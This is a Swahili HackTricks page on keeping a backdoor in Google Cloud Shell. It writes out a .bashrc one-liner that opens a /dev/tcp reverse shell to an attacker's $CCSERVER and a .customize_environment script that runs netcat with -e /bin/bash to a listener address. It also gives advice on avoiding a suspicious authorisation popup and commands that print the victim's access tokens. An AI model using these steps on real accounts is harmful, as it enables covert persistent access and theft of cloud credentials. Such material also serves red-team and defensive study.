# GCP - Uhifadhi wa Cloud Shell

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
*
*
* repos za github.

</details>

## Cloud Shell

Kwa habari zaidi angalia:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Mlango Nyuma wa Kudumu

[**Google Cloud Shell**](https://cloud.google.com/shell/) inakupa ufikiaji wa amri kwa rasilimali zako za wingu moja kwa moja kutoka kwenye kivinjari chako bila gharama yoyote inayohusiana.

Unaweza kupata Cloud Shell ya Google kutoka kwenye **konsoli ya wavuti** au kwa kukimbia **`gcloud cloud-shell ssh`**.

Konsoli hii ina uwezo wa kuvutia kwa wadukuzi:

1. **Mtumiaji yeyote wa Google mwenye ufikiaji wa Google Cloud** ana ufikiaji wa kipengele cha Cloud Shell kilichothibitishwa kabisa (Akaunti za Huduma zinaweza, hata ikiwa ni Wamiliki wa shirika).
2. Kipengele hicho kitabaki na **saraka yake ya nyumbani kwa angalau siku 120** ikiwa hakuna shughuli inayotokea.
3. Hakuna **uwezo wa shirika kufuatilia** shughuli ya kipengele hicho.

Hii kimsingi inamaanisha kwamba mdukuzi anaweza kuweka mlango nyuma kwenye saraka ya nyumbani ya mtumiaji na muda mrefu kama mtumiaji anajiunganisha na GC Shell kila siku 120 angalau, mlango nyuma utaendelea kuwepo na mduduzi atapata kibao kila wakati unapoendeshwa tu kwa kufanya:

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Kuna faili nyingine katika folda ya nyumbani inayoitwa **`.customize_environment`** ambayo, ikiwepo, itatekelezwa **kila wakati** mtumiaji anapopata upatikanaji wa **cloud shell** (kama katika mbinu iliyopita). Ingiza mlango wa nyuma uliopita au moja kama ifuatavyo kudumisha uthabiti muda mrefu mtumiaji anapotumia "mara kwa mara" cloud shell:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Ni muhimu kuzingatia kwamba **wakati kitendo kinachohitaji uthibitisho kinatekelezwa kwa mara ya kwanza**, dirisha la idhini linatokea kwenye kivinjari cha mtumiaji. Dirisha hili lazima lipokelewe kabla ya amri kuendeshwa. Ikiwa dirisha lisilotarajiwa litatokea, linaweza kuzua shaka na kuhatarisha njia ya uthabiti inayotumiwa.
{% endhint %}

Hii ni dirisha la idhini kutoka kwa kutekeleza `gcloud projects list` kutoka kwa ganda la wingu (kama mshambuliaji) ikionekana kwenye kikao cha mtumiaji wa kivinjari:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Hata hivyo, ikiwa mtumiaji ameitumia ganda la wingu kikamilifu, dirisha la idhini halitatokea na unaweza **kukusanya vibali vya mtumiaji na**:
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### Jinsi uhusiano wa SSH unavyoundwa

Kimsingi, maombi haya 3 ya API hutumiwa:

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (itakufanya uongeze funguo yako ya umma uliyounda kwa kienyeji)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (itakufanya uanzishe kipengee)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (itakwambia anwani ya IP ya ganda la google cloud)

Lakini unaweza kupata habari zaidi katika [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## Marejeo

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)
